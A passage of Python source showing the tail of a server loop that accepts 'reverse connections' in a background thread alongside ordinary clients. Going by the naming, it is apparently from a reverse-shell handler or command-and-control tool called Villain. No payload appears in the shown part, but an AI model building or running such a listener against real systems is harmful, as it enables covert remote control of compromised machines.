        def accept_reverse_connections():
            while True:
                try:
                    client, addr = reverse_handler.accept()
                    threading.Thread(target=handle_reverse_connection, args=(client, addr)).start()
                except Exception as e:
                    print(f"[!] Error accepting reverse connection: {e}")
        
        # Start reverse handler thread
        reverse_thread = threading.Thread(target=accept_reverse_connections)
        reverse_thread.daemon = True
        reverse_thread.start()
        
        while True:
            client, addr = server.accept()
            print(f"[+] Connection from {addr[0]}:{addr[1]}")
            
            client_handler = threading.Thread(target=handle_client, args=(client,))
            client_handler.daemon = True
            client_handler.start()
            
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
    finally:
        try:
            server.close()
            reverse_handler.close()
        except:
            pass

if __name__ == "__main__":
    # Parse arguments and initialize settings first
    if args.version:
        print(f'v{Villain.version}')
        exit(0)
        
    # Start the server
    main()
